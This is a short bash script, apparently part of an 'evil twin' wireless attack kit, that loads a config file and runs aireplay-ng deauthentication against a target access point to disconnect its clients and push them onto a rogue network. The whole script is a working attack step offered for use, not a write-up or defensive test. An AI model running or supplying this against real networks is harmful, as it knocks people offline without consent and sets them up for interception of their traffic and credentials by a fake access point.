#! /bin/bash

# disconnect devices and bump them onto our fake network

# BSSID= 20:4E:7F:00:6D:E2
# INTERFACE=wlan1mon
# REQUESTS=0	# 0 = infinite, else > 0 is limited

CONFIG="eviltwin.config"
if test -f $CONFIG ; then
	source $CONFIG
else
	echo "Error: Unable to find '${CONFIG}'."
fi

echo -e "Deauthorizing connected devices"
aireplay-ng --deauth $REQUESTS -a $BSSID $WLANMON --ignore-negative-one
